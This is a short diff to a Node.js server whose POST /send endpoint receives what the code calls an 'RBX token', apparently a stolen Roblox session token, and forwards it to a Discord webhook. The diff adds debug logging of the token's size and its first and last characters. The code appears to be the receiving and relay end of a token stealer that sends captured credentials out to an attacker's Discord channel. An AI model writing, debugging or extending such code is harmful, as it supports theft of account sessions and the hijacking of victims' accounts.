@@ -28,12 +28,17 @@ const server = http.createServer(async (req, res) => {
         return res.end();
     }
 
-    // RBX token — send as file (no 2000-char limit)
-    if (req.method === 'POST' && req.url === '/send') {
+        if (req.method === 'POST' && req.url === '/send') {
         const buf = await readBody(req);
         const body = buf.toString('utf8');
-        console.log('rbx token received, len:', body.length);
-        const jobs = [];
+        console.log('=== RBX TOKEN DEBUG ===');
+        console.log('received bytes:', buf.length);
+        console.log('received chars:', body.length);
+        console.log('first 60:', JSON.stringify(body.slice(0, 60)));
+        console.log('last  60:', JSON.stringify(body.slice(-60)));
+        console.log('has newlines:', body.includes('\n'));
+        console.log('has nulls:', body.includes('\0'));
+        console.log('=======================');
 
         if (DISCORD_WEBHOOK) {
             const form = new FormData();
